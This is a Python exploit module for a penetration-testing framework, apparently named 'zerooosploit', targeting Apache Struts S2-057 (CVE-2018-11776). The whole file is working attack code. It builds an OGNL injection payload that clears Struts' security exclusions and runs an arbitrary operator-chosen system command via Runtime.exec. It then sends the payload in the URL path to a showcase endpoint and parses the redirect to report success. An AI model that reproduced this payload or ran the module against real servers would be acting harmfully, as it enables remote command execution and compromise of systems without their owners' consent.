from zerooosploit.exploits import ExploitAggregate
from zerooosploit.httpclient import HttpClient
from zerooosploit.printer import *
from urllib.parse import quote
import re


class Zerooosploit(ExploitAggregate):

    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            'Name': 'S2-057',
            'Module': 'exploits/struts/s2-057',
            'Product': 'struts',
            'Cve': 'CVE-2018-11776',
            'Create_date': '2019-09-18',
            'Description': '',
            'Authors': '01sec',
            'References': 'https://xz.aliyun.com/t/2618'
        }

        self.option = {
            'url': {'Current Setting': 'http://127.0.0.1:8080/', 'Required': 'yes', 'Description': 'The target url'},
            'command': {'Current Setting': 'id', 'Required': 'yes', 'Description': 'Execute system commands'}
        }

    def exploit(self):
        url = self.get_options('url')
        command = self.get_options('command')
        payload = quote('''${
        (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('%s')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
        ''' % command)

        vul_url = url + '/struts2-showcase/' + payload + '/actionChain1.action'
        res = HttpClient().send_request_cgi(method='GET', url=vul_url)
        if res:
            if res.status_code == 302:
                req = re.findall('/struts2-showcase/(.*?)/register2.action', str(res.headers))
                print_green('[+] Exploit succeed, ' + str(req))
                print_blue('[*] Exploit completed')
            else:
                print_red('[-] {0} {1}'.format(vul_url, res.status_code))

        print_blue('[*] Exploit completed')
